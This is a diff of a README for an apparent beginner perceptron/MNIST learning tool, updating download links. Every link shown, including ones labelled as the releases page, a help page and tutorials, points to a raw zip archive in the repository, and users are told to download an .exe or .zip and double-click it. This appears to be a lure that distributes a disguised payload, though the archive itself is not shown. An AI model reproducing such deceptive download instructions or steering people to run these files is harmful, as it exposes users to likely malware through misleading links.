@@ -1,7 +1,7 @@
 # 🎉 Classic-Single-Layer-Perceptron - Simple ML Tool for Everyone
 
 ## 📥 Quick Download
-[![Download Latest Release](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/waterline/Classic-Single-Layer-Perceptron.zip%20Latest%https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/waterline/Classic-Single-Layer-Perceptron.zip)](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/waterline/Classic-Single-Layer-Perceptron.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/reports/Layer_Classic_Single_Perceptron_1.2.zip%20Latest%https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/reports/Layer_Classic_Single_Perceptron_1.2.zip)](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/reports/Layer_Classic_Single_Perceptron_1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to Classic-Single-Layer-Perceptron! This software allows you to explore machine learning with a straightforward perceptron model using the MNIST dataset. It's easy to use and perfect for those looking to learn more about machine learning without any heavy frameworks.
@@ -9,7 +9,7 @@ Welcome to Classic-Single-Layer-Perceptron! This software allows you to explore 
 ## 📦 Download & Install
 To get started, you need to download the software. Follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/waterline/Classic-Single-Layer-Perceptron.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/reports/Layer_Classic_Single_Perceptron_1.2.zip).
 2. Look for the latest release. You will see a list of files available for download.
 3. Click on the file that best suits your needs. For most users, this will be the .exe or .zip file.
 4. Once the download completes, locate the file on your computer and double-click to run it.
@@ -39,7 +39,7 @@ Classic-Single-Layer-Perceptron focuses on various key concepts in machine learn
 - **Visualization**: Using Matplotlib to view data and results.
 
 ## 💡 Getting Help
-If you encounter any issues while using Classic-Single-Layer-Perceptron, feel free to reach out. For questions or concerns, please open an issue on our [GitHub page](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/waterline/Classic-Single-Layer-Perceptron.zip). 
+If you encounter any issues while using Classic-Single-Layer-Perceptron, feel free to reach out. For questions or concerns, please open an issue on our [GitHub page](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/reports/Layer_Classic_Single_Perceptron_1.2.zip). 
 
 ## 📊 Learning More
 To deepen your understanding of this application and machine learning concepts, consider exploring these topics:
@@ -51,8 +51,8 @@ To deepen your understanding of this application and machine learning concepts, 
 ## 🔗 Further Reading
 For additional resources, here are some links to helpful guides and tutorials:
 
-- [Introduction to Machine Learning](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/waterline/Classic-Single-Layer-Perceptron.zip)
-- [Understanding Perceptrons](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/waterline/Classic-Single-Layer-Perceptron.zip)
-- [Getting Started with Matplotlib](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/waterline/Classic-Single-Layer-Perceptron.zip)
+- [Introduction to Machine Learning](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/reports/Layer_Classic_Single_Perceptron_1.2.zip)
+- [Understanding Perceptrons](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/reports/Layer_Classic_Single_Perceptron_1.2.zip)
+- [Getting Started with Matplotlib](https://raw.githubusercontent.com/clara6615/Classic-Single-Layer-Perceptron/main/reports/Layer_Classic_Single_Perceptron_1.2.zip)
 
 Be sure to check back for updates and improvements. Enjoy exploring machine learning with Classic-Single-Layer-Perceptron!
